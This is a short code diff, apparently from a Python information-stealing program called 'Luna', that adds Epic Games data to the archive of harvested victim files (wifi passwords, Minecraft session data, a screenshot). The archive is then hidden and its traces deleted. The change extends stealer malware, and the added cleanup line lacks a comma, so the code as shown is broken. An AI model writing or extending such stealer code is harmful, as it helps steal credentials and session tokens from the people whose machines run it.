@@ -556,6 +556,7 @@ def zipup():
         zipf.write("wifi-passwords.txt")
         zipf.write("minecraft-sessioninfo.json")
         zipf.write("minecraft-usercache.json")
+        zipf.write("epicgames-data.txt")
         zipf.write("screenshot.png")
     hide(f'Luna-Logged-{os.getenv("Username")}.zip')
 
@@ -566,6 +567,7 @@ def cleanup():
                   os.remove("wifi-passwords.txt"),
                   os.remove("minecraft-usercache.json"),
                   os.remove("minecraft-sessioninfo.json"),
+                  os.remove("epicgames-data.txt")
                   os.remove("screenshot.png"),
                   os.remove(f"Luna-Logged-{os.getenv('Username')}.zip")]:
         try:
